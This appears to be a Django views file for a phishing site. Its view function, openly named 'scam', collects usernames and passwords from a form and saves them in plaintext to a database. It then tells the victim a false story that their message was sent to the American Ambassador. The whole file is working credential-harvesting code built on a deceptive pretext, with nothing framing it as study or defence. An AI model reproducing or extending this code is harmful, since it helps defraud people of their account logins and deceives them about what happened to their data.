from django.shortcuts import render,redirect
from django.http import HttpResponseRedirect
from app.models import Login
from django. contrib import messages

# Create your views here.
def scam(request):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        login = Login(username=username, password=password)
        login.save()
        messages.success(request, f'Congratulations, your message has been sent to the American Ambassador')
        return redirect('home')

      
    
    return render(request, 'index.html')

def index(request):
    return render(request, 'message.html')


